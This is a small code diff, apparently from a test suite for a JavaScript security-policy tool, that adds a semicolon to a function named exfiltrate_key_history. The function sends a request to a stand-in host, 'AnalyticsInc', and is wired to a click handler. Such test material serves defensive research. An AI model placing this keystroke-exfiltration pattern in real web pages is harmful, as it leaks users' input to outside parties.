@@ -7,6 +7,6 @@ function exfiltrate_key_history() {
   v0.opennew = v3;
   JAM.call(xmlhttp.opennew, xmlhttp, ["GET", "http://AnalyticsInc:8000/submission.html?test=clone2", true], JAM.policy.p1);
   JAM.call(xmlhttp.send, xmlhttp, [null], JAM.policy.p1);
-  return
+  return;
 }
 JAM.set(document.getElementById("test"), "onclick", exfiltrate_key_history)
